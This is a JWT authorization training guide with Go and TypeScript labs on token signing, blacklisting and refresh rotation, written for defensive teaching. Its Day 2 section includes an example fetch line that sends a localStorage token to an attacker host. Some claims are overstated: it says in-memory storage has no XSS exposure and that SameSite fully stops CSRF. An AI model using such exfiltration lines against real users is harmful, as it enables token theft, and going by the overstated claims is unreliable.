# Masterclass Deep-Dive: Modern Authorization and JSON Web Tokens (JWT)

Welcome to your comprehensive, 3-day deep-dive training guide focusing exclusively on the core requirement: **"Knowledge of modern authorization mechanisms, such as JSON Web Token"**.

---

# 🚀 SECTION 0: Advanced Engineering Blueprint: Asymmetric Cryptography & Security Architecture

To successfully clear senior security and architectural reviews, you must be prepared to detail the mathematical foundations of signing algorithms, dynamic public key distribution caches, and browser-layer security header architectures.

---

## 1. Cryptographic Mechanics: Symmetric HMAC vs. Asymmetric RSA

JWTs require signatures to prevent clients from modifying payloads. There are two core ways to handle this mathematically:

### A. Symmetric Hashing (HMAC-SHA256 / HS256)
*   **The Math:** Uses a single, shared secret key $K$. The signature is computed using a one-way hash algorithm:
    $$\text{Signature} = \text{HMAC-SHA256}(\text{Header} . \text{Payload}, K)$$
*   **Drawback:** It is a **shared secret**. If any downstream microservice needs to verify the token, they must have the key $K$. If one microservice gets breached, the attacker gains the power to *sign and issue* fully-trusted fraudulent tokens.

### B. Asymmetric Encryption (RSA-SHA256 / RS256)
*   **The Math:** Uses a **Public-Private Key Pair** mathematically bound together via prime number modular arithmetic.
    *   **The Private Key ($d, n$):** Kept secure on your Authorization server. Used to sign the token by encrypting the payload hash:
        $$\text{Signature} = \text{Encrypt-RSA}(\text{SHA256}(\text{Header} . \text{Payload}), d)$$
    *   **The Public Key ($e, n$):** Distributed freely to all downstream API resource servers. They use the public key to decrypt and verify the signature hash:
        $$\text{DecryptedHash} = \text{Decrypt-RSA}(\text{Signature}, e)$$
        $$\text{Assert}(\text{DecryptedHash} == \text{SHA256}(\text{Header} . \text{Payload}))$$
*   **Benefit:** Downstream microservices can verify tokens safely using the public key without any risk of creating new tokens.

---

## 2. Dynamic Public Key Distribution: JWKS (JSON Web Key Set)

In asymmetric architectures (RS256), downstream microservices must not hardcode public keys, as doing so makes key rotation impossible. Instead, they use a **JWKS (JSON Web Key Set)** endpoint.

```
 [Authorization Server] ──(exposes public keys)──► [https://auth.com/.well-known/jwks.json]
                                                               │
                                                       (Queries and caches)
                                                               ▼
                                                       [Microservice API]
```

### How JWKS works under high throughput:
1.  **The JWKS Endpoint:** The auth server exposes a public JSON array containing verified public keys:
    ```json
    {
      "keys": [
        { "kty": "RSA", "kid": "key-v1", "alg": "RS256", "n": "modulus...", "e": "AQAB" }
      ]
    }
    ```
2.  **Downstream Verification:** When an API receives a JWT, it inspects the token’s Header for the Key ID (`kid` claim).
3.  **Caching Lookup:** The API queries its local cache for `"key-v1"`. If not found, it fetches the JWKS JSON, extracts the public key matching `"key-v1"`, and caches it (using standard Cache-Control headers of 24+ hours) to avoid making network queries on every request.

---

## 3. Browser Security Headers: CSP, HSTS, and X-Frame-Options

Securing tokens requires configuring robust **Security Headers** on your web server:

1.  **Content Security Policy (CSP):** Mitigates XSS attacks by restricting where scripts can load and execute.
    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; connect-src 'self' https://api.adplatform.com;
    ```
    *   *How it works:* If an attacker attempts to inject a script that exfiltrates tokens to their server, the browser will block the network request because the attacker's domain is not declared in the `connect-src` list.
2.  **HTTP Strict Transport Security (HSTS):** Forces browsers to load your site strictly over encrypted HTTPS connections, preventing SSL-stripping and packet-sniffing attacks.
    ```http
    Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
    ```
3.  **X-Frame-Options:** Prevents your dashboard from being loaded inside an `<iframe>` on external, malicious websites, protecting users from **Clickjacking** attacks.
    ```http
    X-Frame-Options: DENY
    ```

---

# 📅 DAY 1: Stateful vs. Stateless Auth, JWT Anatomy, and Cryptography

---

## 1. Architectural Trade-offs: Stateful vs. Stateless Authentication

Before implementing authorization APIs, you must understand why the modern web has moved from stateful sessions to stateless JSON Web Tokens.

```
STATEFUL (SESSION ID):
[Client] ──(requests auth)──► [Web Server] ──(queries session store)──► [Database/Redis]
                                 *Writes Session Record to Store*

STATELESS (JWT):
[Client] ──(requests auth)──► [Web Server] ──(signs self-contained token)──► [Client]
                                 *No database querying needed on subsequent calls*
```

### Stateful Sessions (Session Cookies)
*   **How it works:** 
    1.  The client logs in with credentials.
    2.  The server verifies credentials, generates a unique random string called a **Session ID**, and stores it in an active session database (like Redis, Memcached, or PostgreSQL).
    3.  The server returns the Session ID in a Cookie.
    4.  On subsequent requests, the browser sends the Session ID cookie. The server must query the database on **every single incoming HTTP request** to verify if the session is still active and retrieve user scopes.
*   **Pros:** Instant invalidation capability. If an administrator wants to force-log out a user, they simply delete the session record from Redis, immediately rendering the client's Session ID useless.
*   **Cons (The Scaling Wall):** In high-throughput environments (like an ad exchange processing millions of event queries), querying a database or cache cluster on every incoming HTTP query creates massive connection overhead and single-point-of-failure database dependencies.

### Stateless Sessions (JSON Web Tokens)
*   **How it works:**
    1.  The client logs in.
    2.  The server verifies credentials, packs user metadata (user ID, roles, scopes) into a JSON object, and **cryptographically signs** it.
    3.  The server returns this signed string—the **JWT**—to the client.
    4.  On subsequent requests, the client attaches the JWT to the `Authorization` header.
    5.  The API gateway parses the JWT, verifies the signature using a cryptographic public or secret key, and validates its expiration. If valid, the user metadata is trusted **without performing any database or database cache lookups**.
*   **Pros:** High-performance, distributed scaling, and zero database lookups for API gateways. Perfect fit for decoupled microservices.
*   **Cons:** Hard to revoke. Once a JWT is issued, it is valid anywhere until its scheduled expiration time (`exp`), even if the user changes their password or is deleted from the database.

---

## 2. The Anatomy of a JSON Web Token

A JSON Web Token is a compact, URL-safe string comprised of three distinct parts separated by dots (`.`):
$$\text{JWT} = \text{Header} . \text{Payload} . \text{Signature}$$

### Part 1: The Header
The Header is a Base64URL-encoded JSON string containing metadata about how the token is signed.
```json
{
  "alg": "HS256", // Cryptographic algorithm used to generate the signature
  "typ": "JWT"    // Type of token
}
```

### Part 2: The Payload (Claims)
The Payload is a Base64URL-encoded JSON string containing **Claims**—statements about the user and additional context.
There are three categories of claims:

#### A. Registered / Reserved Claims (Defined by RFC 7519)
These claims have pre-defined meanings and are critical for secure validation:
*   `iss` (Issuer): Identifies who created the token (e.g., `https://auth.adplatform.com`).
*   `sub` (Subject): Identifies the user (e.g., `user_id_102030`).
*   `exp` (Expiration Time): Unix timestamp indicating when the token becomes invalid. **Must always be set.**
*   `nbf` (Not Before): Unix timestamp indicating the exact second before which the token must not be accepted.
*   `iat` (Issued At): Unix timestamp indicating when the token was created.
*   `jti` (JWT ID): A unique random identifier for the token, useful for tracking and preventing replay attacks.

#### B. Public Claims
Claims defined in open standard lists (like the IANA JSON Web Token Registry) to prevent namespace collisions.

#### C. Private / Custom Claims
Custom key-value pairs designed to share application-specific authorization scopes:
```json
{
  "sub": "usr-884422",
  "name": "Alex Mercer",
  "role": "ACCOUNT_MANAGER",
  "permissions": ["CAMPAIGNS_CREATE", "BILLING_READ", "ANALYTICS_EXPORT"],
  "exp": 1781942400
}
```

### Part 3: The Signature
The Signature is computed by concatenating the Base64URL-encoded Header and Payload with a dot, then hashing the combined string using a secret key:
$$\text{Signature} = \text{Encrypt}(\text{Base64Url}(\text{Header}) + "." + \text{Base64Url}(\text{Payload}), \text{SecretKey})$$

---

## 3. Cryptographic Signing: Symmetric vs. Asymmetric

A major interview talking point for senior-level candidates is selecting the correct signing algorithm.

### Symmetric Cryptography: HS256 (HMAC using SHA-256)
*   **The Model:** Uses a **single shared secret key** for both signing (generating the JWT) and verifying (validating the signature).
*   **Drawbacks in Distributed Architectures:**
    ```
    [ Auth Server ] ──(signs with SecretKey "X")──► [ JWT Token ]
                                                       │
         ┌─────────────────── Sends to ────────────────┘
         ▼
    [ Billing API ] (Must have SecretKey "X" to verify)
    [ Reporting API ] (Must have SecretKey "X" to verify)
    ```
    If any downstream API microservice (such as a third-party reporting partner) is compromised, the attacker gains access to `SecretKey "X"` and can generate fraudulent, fully-trusted tokens for any account.

### Asymmetric Cryptography: RS256 (RSA Signature using SHA-256)
*   **The Model:** Uses a **Public-Private Key Pair**.
    *   **Private Key:** Kept strictly secure on your **Auth Server** and used to sign the token.
    *   **Public Key:** Distributed freely to all downstream API resource servers, used *only* to verify that the token was signed by the auth server's private key. Public keys cannot generate signatures.
*   **Benefits:** Downstream microservices can verify tokens without any risk of creating fraudulent ones. If a microservice is compromised, your core authentication system remains secure.
*   **JWKS (JSON Web Key Set):** API resource servers can dynamically fetch the list of verified public keys from the auth server's `/well-known/jwks.json` endpoint, enabling automatic key rotation without redeploying backend APIs.

---

## 🛠️ Day 1 Practical Lab

### Task: Implement Raw Base64URL encoding, decoding, and SHA-256 HMAC signature verification in Go WITHOUT importing any third-party JWT frameworks.

This exercise forces you to understand the exact mechanics of cryptographic token parsing and verification.

#### File: `rawjwt.go`
```go
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
)

// Base64URL encoding/decoding helper omitting trailing '=' padding as required by RFC 7515
func base64URLEncode(src []byte) string {
	return base64.RawURLEncoding.EncodeToString(src)
}

func base64URLDecode(src string) ([]byte, error) {
	return base64.RawURLEncoding.DecodeString(src)
}

// GenerateSignature signs input content using HMAC-SHA256
func GenerateSignature(signingInput string, secret []byte) []byte {
	h := hmac.New(sha256.New, secret)
	h.Write([]byte(signingInput))
	return h.Sum(nil)
}

// VerifyJWT validates raw token strings manually
func VerifyJWT(tokenString string, secret []byte) (string, error) {
	// 1. Split token into Header.Payload.Signature
	parts := strings.Split(tokenString, ".")
	if len(parts) != 3 {
		return "", errors.New("invalid token format: must contain 3 dot-separated components")
	}

	headerSegment := parts[0]
	payloadSegment := parts[1]
	signatureSegment := parts[2]

	// 2. Re-create the signing input string
	signingInput := headerSegment + "." + payloadSegment

	// 3. Decode the token's signature from Base64URL back to bytes
	providedSigBytes, err := base64URLDecode(signatureSegment)
	if err != nil {
		return "", fmt.Errorf("failed to decode signature: %v", err)
	}

	// 4. Generate the expected signature
	expectedSigBytes := GenerateSignature(signingInput, secret)

	// 5. Use hmac.Equal to prevent timing attacks
	if !hmac.Equal(providedSigBytes, expectedSigBytes) {
		return "", errors.New("cryptographic signature mismatch: token has been altered or signed with an incorrect key")
	}

	// 6. Signature is valid! Decode and return the raw JSON Payload
	payloadBytes, err := base64URLDecode(payloadSegment)
	if err != nil {
		return "", fmt.Errorf("failed to decode payload: %v", err)
	}

	return string(payloadBytes), nil
}

func main() {
	secretKey := []byte("platform_top_secret_salt")

	// Sample JSON Header and Payload
	header := `{"alg":"HS256","typ":"JWT"}`
	payload := `{"user_id":"usr-9900","role":"ADMIN","exp":1893456000}`

	// 1. Generate Base64Url segments
	encodedHeader := base64URLEncode([]byte(header))
	encodedPayload := base64URLEncode([]byte(payload))

	// 2. Build signing input and generate signature
	signingInput := encodedHeader + "." + encodedPayload
	signatureBytes := GenerateSignature(signingInput, secretKey)
	encodedSignature := base64URLEncode(signatureBytes)

	// 3. Construct final compact token string
	token := encodedHeader + "." + encodedPayload + "." + encodedSignature
	fmt.Printf("Generated JWT:\n%s\n\n", token)

	// 4. Run verification
	decodedPayload, err := VerifyJWT(token, secretKey)
	if err != nil {
		fmt.Printf("Verification failed: %v\n", err)
	} else {
		fmt.Printf("Verification Successful!\nDecoded Payload:\n%s\n", decodedPayload)
	}
}
```

---

# 📅 DAY 2: Browser Storage Security, Attacks, and Token Revocation

---

## 1. Browser Token Storage Comparison

A major source of vulnerabilities in modern single-page applications is selecting the wrong browser storage mechanism.

| Storage Option | Access Method | Vulnerability to XSS | Vulnerability to CSRF | Implementation Complexity |
| :--- | :--- | :--- | :--- | :--- |
| **LocalStorage / SessionStorage** | Readable via Javascript (`localStorage.getItem()`) | **Extremely High** | None | Extremely Low |
| **In-Memory (React State)** | Stored in JavaScript variables | **None** | None | Medium (requires Refresh Token pairing) |
| **HTTPOnly, Secure, SameSite Cookie** | Automatic browser attachment (No JS access) | **None** | **Medium** (Mitigated via SameSite config) | High (requires backend CORS alignment) |

### The XSS Risk (Local Storage)
Cross-Site Scripting (XSS) occurs when an attacker successfully executes malicious JavaScript inside your user's browser (e.g., via a compromised npm package or unescaped user comments).
*   **The Threat:** If a JWT is stored in `localStorage`, any script executing in the browser can run:
    ```javascript
    fetch('https://attacker-server.com/steal?token=' + localStorage.getItem('token'));
    ```
    This leaks the token to the attacker, giving them full API access.

### The CSRF Risk (Cookie Storage)
Cross-Site Request Forgery (CSRF) occurs when an attacker trick a user's browser into executing an unwanted action on a trusted site where they are logged in.
*   **The Threat:** Browsers automatically attach cookies to every request sent to the domain that issued them. If a user is logged in to your ad dashboard and clicks a link on a malicious site, the malicious site can send an API call to `/api/billing/update`—and your browser will attach the authorization session cookie automatically.
*   **Mitigation:** Configure cookie attributes:
    *   `HttpOnly`: Prevents client-side scripts from reading the cookie, stopping XSS exfiltration.
    *   `Secure`: Ensures the cookie is only transmitted over encrypted HTTPS connections.
    *   `SameSite=Lax` or `SameSite=Strict`: Restricts the browser from sending the cookie with cross-site requests, completely mitigating CSRF attacks.

---

## 2. Common JWT Security Exploits & Mitigation

To clear senior security screens, you must be prepared to outline mitigations for these standard attacks:

### Exploit A: The `alg: none` Attack
*   **The Attack:** Early JWT libraries allowed checking tokens signed with the algorithm `"none"`. An attacker could modify a JWT's header to `{"alg":"none"}` and remove the signature component. The vulnerable backend parser would see "none", skip signature validation, and accept the claims blindly.
*   **Mitigation:** Always configure your backend parser with an explicit list of accepted algorithms (e.g., `[]string{"HS256"}`), and explicitly reject any tokens where `"alg": "none"`.

### Exploit B: Token Replay / Exfiltration
*   **The Attack:** An attacker sniffs network logs or gains access to an expired token to execute API actions.
*   **Mitigation:** Keep Access Token lifetimes extremely short (e.g., 5-15 minutes). Implement strict **Content Security Policies (CSP)** headers on your frontend to restrict where scripts can send data, preventing XSS exfiltration.

---

## 3. JWT Revocation Architectures

Because JWTs are stateless, they cannot be natively revoked. If an administrator deletes a user's account, how do you stop their active JWT from working before its expiration time?

### Strategy A: Blacklisting / Revocation Lists (Highly Scalable)
*   **How it works:** When a user logs out or is suspended, append their token's unique ID (`jti` claim) to a high-performance database cluster (e.g., Redis).
*   **Backend Validation:** Middleware checks if the token's `jti` exists in the Redis blacklist. If present, the request is rejected with `401 Unauthorized`.
*   **Redis TTL (Time-To-Live):** Store the blacklist record with an expiration time equal to the token's remaining lifetime, ensuring Redis automatically cleans up expired tokens to save memory.

### Strategy B: Dynamic User Salt
*   **How it works:** Sign tokens using a composite key containing a global secret and a user-specific value (e.g., a hash of the user's password or a tracking counter in their database record).
    $$\text{SecretKey} = \text{GlobalSecret} + \text{UserPasswordHash}$$
*   **Backend Validation:** On every request, the backend fetches the target user's password hash from cache and verifies the token's signature with the composite secret.
*   **Revocation Trigger:** If the user resets their password, their database hash changes. All previously issued tokens immediately fail signature verification, logging them out on all devices.

---

## 🛠️ Day 2 Practical Lab

### Task: Implement a High-Performance Redis-based Token Blacklist Revocation Interceptor Middleware in Go.

This lab simulates real-world session termination using Go and memory-map representations.

#### File: `blacklist.go`
```go
package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"
)

// RedisMock simulates a thread-safe Redis cluster cache for blacklisted JTIs
type RedisMock struct {
	mu         sync.RWMutex
	blacklist map[string]time.Time
}

var cache = &RedisMock{
	blacklist: make(map[string]time.Time),
}

func (r *RedisMock) BlacklistToken(jti string, ttl time.Duration) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.blacklist[jti] = time.Now().Add(ttl)
	log.Printf("[Redis Cache] Blacklisted token JTI: %s for duration: %v", jti, ttl)
}

func (r *RedisMock) IsBlacklisted(jti string) bool {
	r.mu.RLock()
	defer r.mu.RUnlock()
	expireAt, exists := r.blacklist[jti]
	if !exists {
		return false
	}
	// Automatically clean up expired cache entries
	if time.Now().After(expireAt) {
		return false
	}
	return true
}

// SecurityMiddleware intercepts requests and verifies if token JTI has been revoked
func SecurityMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Mock JTI token extraction (In production, parse this from claims)
		jti := r.URL.Query().Get("jti")
		if jti == "" {
			http.Error(w, "Query parameter 'jti' missing", http.StatusBadRequest)
			return
		}

		// Check the Redis blacklist
		if cache.IsBlacklisted(jti) {
			http.Error(w, "Access Denied: This token session has been explicitly revoked/logged out", http.StatusUnauthorized)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintln(w, "Welcome back, Account Manager. Access to dashboard metrics approved.")
}

func main() {
	// Seed mock Redis with blacklisted JTIs
	cache.BlacklistToken("token-id-12345", 5*time.Minute)
	cache.BlacklistToken("token-id-abcde", 10*time.Minute)

	mux := http.NewServeMux()
	mux.Handle("/api/dashboard", SecurityMiddleware(http.HandlerFunc(dashboardHandler)))

	log.Println("Server executing on http://localhost:8080 ...")
	log.Println("Test valid request: http://localhost:8080/api/dashboard?jti=token-ok")
	log.Println("Test blacklisted request: http://localhost:8080/api/dashboard?jti=token-id-12345")

	if err := http.ListenAndServe(":8080", mux); err != nil {
		log.Fatal(err)
	}
}
```

---

# 📅 DAY 3: The Access + Refresh Token Pipeline & Rotation

---

## 1. Dual-Token Architecture Strategy

To maximize performance, security, and user experience, production platforms employ a **Dual-Token System**.

```
 ACCESS TOKEN (Short-lived, e.g., 15 mins)
   Stored: In-Memory (React state variable)
   Use: Sent in Authorization Header for API calls

 REFRESH TOKEN (Long-lived, e.g., 7 days)
   Stored: HTTPOnly, Secure, SameSite Cookie
   Use: Sent to /api/auth/refresh to re-request access tokens
```

### The Refresh Rotation Flow
To protect against stolen long-lived refresh tokens, configure **Refresh Token Rotation (RTR)**:
1.  When a client requests a new access token using their refresh token:
2.  The server validates the refresh token, invalidates it, and generates a **new** refresh token alongside the new access token.
3.  If an attacker steals a refresh token and attempts to use it after the legitimate user has already rotated it, the server detects reuse, invalidates the entire token family, and forces all devices to log out.

---

## 🛠️ Day 3 Capstone Lab

### Implement a production-grade, highly secure dual-token authentication backend with refresh rotation in Go, coupled with a React frontend interceptor mechanism to automatically handle token renewal on expiry.

---

### Step 1: Secure Go Backend (`auth_server.go`)
```go
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"
)

type TokenResponse struct {
	AccessToken string `json:"access_token"`
}

type TokenStore struct {
	mu           sync.Mutex
	activeTokens map[string]string // maps refresh_token -> user_id
}

var store = &TokenStore{
	activeTokens: make(map[string]string),
}

// Configure CORS and Cookie Credentials headers
func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "http://localhost:3000") // Explicit origin required when using credentials!
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Credentials", "true")

		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// Generate secure dummy access tokens (In production, sign these as actual JWTs)
func makeAccessToken(userID string) string {
	return fmt.Sprintf("access-%s-%d", userID, time.Now().Unix())
}

// Generate secure dummy refresh tokens
func makeRefreshToken() string {
	return fmt.Sprintf("refresh-%d", time.Now().UnixNano())
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	userID := "usr-rakuten"

	accessToken := makeAccessToken(userID)
	refreshToken := makeRefreshToken()

	store.mu.Lock()
	store.activeTokens[refreshToken] = userID
	store.mu.Unlock()

	// Store Refresh Token in a highly secure HTTPOnly cookie
	cookie := &http.Cookie{
		Name:     "refresh_token",
		Value:    refreshToken,
		Path:     "/api/auth", // Restricted only to authorization renew paths!
		HttpOnly: true,
		Secure:   false, // Set to true in production over HTTPS!
		SameSite: http.SameSiteLaxMode,
		Expires:  time.Now().Add(7 * 24 * time.Hour),
	}
	http.SetCookie(w, cookie)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(TokenResponse{AccessToken: accessToken})
}

func refreshHandler(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("refresh_token")
	if err != nil {
		http.Error(w, "Missing refresh token cookie", http.StatusUnauthorized)
		return
	}

	providedRefresh := cookie.Value

	store.mu.Lock()
	userID, exists := store.activeTokens[providedRefresh]
	if exists {
		// IN_ACTION: ROTATION
		// Invalidate previous refresh token and issue a fresh one
		delete(store.activeTokens, providedRefresh)
		newRefresh := makeRefreshToken()
		store.activeTokens[newRefresh] = userID

		// Re-set updated cookie
		newCookie := &http.Cookie{
			Name:     "refresh_token",
			Value:    newRefresh,
			Path:     "/api/auth",
			HttpOnly: true,
			Secure:   false,
			SameSite: http.SameSiteLaxMode,
			Expires:  time.Now().Add(7 * 24 * time.Hour),
		}
		http.SetCookie(w, newCookie)

		newAccess := makeAccessToken(userID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(TokenResponse{AccessToken: newAccess})
	} else {
		http.Error(w, "Invalid or expired refresh token", http.StatusUnauthorized)
	}
	store.mu.Unlock()
}

func resourceHandler(w http.ResponseWriter, r *http.Request) {
	authHeader := r.Header.Get("Authorization")
	if authHeader == "" || !strings.HasPrefix(authHeader, "Bearer ") {
		http.Error(w, "Missing token", http.StatusUnauthorized)
		return
	}
	
	// Simulate checking if access token is expired (even-second values expire for mock testing)
	if time.Now().Second()%2 == 0 {
		http.Error(w, "Token Expired", http.StatusUnauthorized)
		return
	}

	fmt.Fprintln(w, `{"status": "success", "data": "Ad Campaign aggregates parsed safely."}`)
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/auth/login", loginHandler)
	mux.HandleFunc("/api/auth/refresh", refreshHandler)
	mux.HandleFunc("/api/campaigns", resourceHandler)

	handler := corsMiddleware(mux)
	log.Println("Dual-token Auth server starting on http://localhost:8080 ...")
	if err := http.ListenAndServe(":8080", handler); err != nil {
		log.Fatal(err)
	}
}
```

---

### Step 2: React Token Interceptor (`authClient.ts`)

This client helper intercepts API fetch responses. If an API request fails due to an expired access token (`401 Unauthorized`), it automatically requests a new access token via `/refresh` and retries the original request, creating a seamless user experience.

```typescript
let activeAccessToken: string | null = null;

export function setAccessToken(token: string) {
  activeAccessToken = token;
}

// Automated HTTP Fetch Client with token refreshing
export async function secureFetch(url: string, options: RequestInit = {}): Promise<Response> {
  // 1. Inject Authorization header if we have an active access token
  options.headers = {
    ...options.headers,
    'Content-Type': 'application/json',
  } as any;

  if (activeAccessToken) {
    (options.headers as any)['Authorization'] = `Bearer ${activeAccessToken}`;
  }

  // Include credentials (cookies) for cross-site refresh requests
  options.credentials = 'include';

  let response = await fetch(url, options);

  // 2. If access token is expired, trigger refresh flow
  if (response.status === 401) {
    console.warn('Access token expired. Requesting refresh...');
    
    const refreshResponse = await fetch('http://localhost:8080/api/auth/refresh', {
      method: 'POST',
      credentials: 'include', // Sends HTTPOnly refresh cookie automatically
    });

    if (refreshResponse.ok) {
      const data = await refreshResponse.json();
      const newAccessToken = data.access_token;
      
      // Update in-memory state
      setAccessToken(newAccessToken);

      // 3. Retry original request with the fresh token
      (options.headers as any)['Authorization'] = `Bearer ${newAccessToken}`;
      response = await fetch(url, options);
    } else {
      console.error('Session expired. Redirecting to login page...');
      activeAccessToken = null;
      // Trigger logout redirect here
    }
  }

  return response;
}
```

---

---

## 🗂️ Interactive Flashcard Deck
*Test your knowledge interactively. Click on each card to reveal the hidden answer.*

<details>
<summary><b>Card 1: What is the primary performance benefit of using stateless JWT authentication over database session cookies?</b></summary>
<p><b>Answer:</b></p>
<p>Stateless JWT authentication allows API gateway microservices to parse and verify user scopes entirely in-memory using cryptographic key signatures. This completely eliminates the need to perform a database or cache query on every incoming HTTP request, removing massive query latency and database connection overhead.</p>
</details>

<details>
<summary><b>Card 2: Explain the difference between HS256 and RS256, and under what conditions you would choose RS256.</b></summary>
<p><b>Answer:</b></p>
<p>HS256 is a symmetric algorithm that uses a single shared secret key for both signing and verifying, which is risky if shared with multiple services. RS256 is an asymmetric algorithm that uses a Public-Private key pair. The private key signs the token, and a public key verifies it. You should choose RS256 in multi-service or microservice environments to let downstream services verify tokens safely without the risk of generating fraudulent ones.</p>
</details>

<details>
<summary><b>Card 3: Why is storing access tokens in localStorage discouraged in applications handled by third-party scripts? How does storing them in-memory paired with HttpOnly cookies mitigate this?</b></summary>
<p><b>Answer:</b></p>
<p><code>localStorage</code> is vulnerable to Cross-Site Scripting (XSS) attacks; any script running in the browser can read its contents and exfiltrate tokens. Storing access tokens in-memory prevents JS script exfiltration because variables are scoped to React's closed runtime. Pairing this with HTTPOnly refresh cookies ensures long-term sessions are maintained safely, as HTTPOnly cookies are completely inaccessible to client-side scripts.</p>
</details>

<details>
<summary><b>Card 4: Describe how Refresh Token Rotation (RTR) protects against stolen refresh tokens.</b></summary>
<p><b>Answer:</b></p>
<p>Refresh Token Rotation invalidates the previous refresh token and issues a new one with every token renewal request. If an attacker steals a refresh token and attempts to use it, the server will detect that the old token is being reused. It will immediately invalidate the entire family of tokens associated with that user session, forcing a full logout on all devices.</p>
</details>

<details>
<summary><b>Card 5: Why is using hmac.Equal critical when comparing cryptographic signature byte structures?</b></summary>
<p><b>Answer:</b></p>
<p>Standard string or byte comparisons break execution as soon as they encounter a character mismatch, which leaks timing information to attackers (Timing Attacks). <code>hmac.Equal</code> performs a constant-time comparison, executing the exact same number of clock cycles regardless of where a mismatch occurs, preventing attackers from brute-forcing signatures byte-by-byte.</p>
</details>
